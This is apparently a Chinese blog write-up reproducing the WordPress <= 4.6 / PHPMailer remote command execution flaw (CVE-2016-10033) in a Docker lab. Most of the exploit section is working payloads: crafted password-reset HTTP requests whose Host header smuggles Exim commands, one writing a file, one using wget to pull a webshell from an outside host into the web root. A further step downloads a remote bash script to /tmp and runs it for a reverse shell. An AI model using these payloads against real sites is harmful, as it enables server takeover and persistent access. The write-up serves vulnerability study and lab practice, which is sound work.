---
title: WordPress <= 4.6 命令执行漏洞(CVE-2016-10033)
category: 
- 渗透测试
tags: 
- Docker
- 漏洞复现
---

### 漏洞信息

WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 < 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。

### 影响版本

WordPress <= 4.6

### 镜像信息

![image-20201201143200759](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201143200759.png)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:w_wordpress_6
```

- 启动环境

```bash
$ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6
```

<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

![image-20201201143345117](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201143345117.png)

### 利用过程

- 启动kali
- 使用docker搭建漏洞环境

### Poc：

填写目标 IP 和 端口

```http
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}vuln}} null)
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

访问：http://127.0.0.1:8000/vuln看到返回状态码为 200 代表已经成功创建了 `/var/www/html/vuln` 文件

### Exp：

在远程 HTTP 服务器上创建一个文本文件，通过 `wget` 下载到目标机器上

1、向目标写webshell

```http
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}webshell.php${substr{10}{1}{$tod_log}}raw.githubusercontent.com${substr{0}{1}{$spool_directory}}medicean${substr{0}{1}{$spool_directory}}vulapps${substr{0}{1}{$spool_directory}}master${substr{0}{1}{$spool_directory}}w${substr{0}{1}{$spool_directory}}wordpress${substr{0}{1}{$spool_directory}}6${substr{0}{1}{$spool_directory}}webshell.php}} null)
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

访问 http://127.0.0.1:8000/webshell.php

![image-20201201150609182](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201150609182.png)

2、反弹shell

远程文本文件内容如果是 bash 脚本，可在下载到目标后，直接用 `/bin/bash` 来执行该文件

下载脚本：

```bash
/usr/bin/wget --output-document /tmp/rce example.com/1.txt
```

执行：

```bash
/bin/bash /tmp/rce
```

### 参考链接

[references](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)